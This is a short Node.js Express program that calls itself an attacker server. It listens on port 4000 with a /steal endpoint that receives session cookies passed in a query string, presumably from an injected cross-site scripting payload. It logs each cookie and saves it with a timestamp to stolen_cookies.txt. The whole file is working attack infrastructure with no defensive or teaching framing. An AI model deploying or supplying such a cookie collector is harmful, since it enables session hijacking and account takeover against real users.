const express = require('express');
const app = express();
const fs = require('fs'); // Import file system to log stolen cookies

// Define route to capture stolen cookies
app.get('/steal', (req, res) => {
    const stolenCookie = req.query.cookie;

    if (stolenCookie) {
        console.log("🚨 Stolen Cookie: ", stolenCookie);

        // Save the stolen cookie to a log file
        fs.appendFile('stolen_cookies.txt', `${new Date()} - ${stolenCookie}\n`, (err) => {
            if (err) {
                console.error("Error writing to file", err);
            }
        });

        res.send('Cookie stolen and logged!');
    } else {
        res.send('No cookie received.');
    }
});

// Start the attacker server on port 4000
app.listen(4000, '0.0.0.0', () => {
    console.log('🚀 Attacker server running on http://0.0.0.0:4000');
});

